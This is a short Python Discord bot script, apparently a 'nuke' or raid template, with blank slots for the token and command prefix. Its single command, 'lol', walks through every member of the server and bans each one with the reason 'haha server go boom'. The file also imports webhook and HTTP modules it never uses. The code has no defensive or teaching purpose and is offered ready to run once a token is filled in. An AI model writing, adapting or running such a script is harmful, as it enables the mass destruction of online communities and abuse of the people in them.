token = ""
#have intents on#


prefix = ""

import discord, random, aiohttp, asyncio
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S



bot = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())





@bot.event
async def on_ready():
  print(f"""bot is ready""")








@bot.command()
async def lol(ctx):
    for user in ctx.guild.members:
        await user.ban(reason = "haha server go boom")


#dont touch anything below this#


bot.run(token)
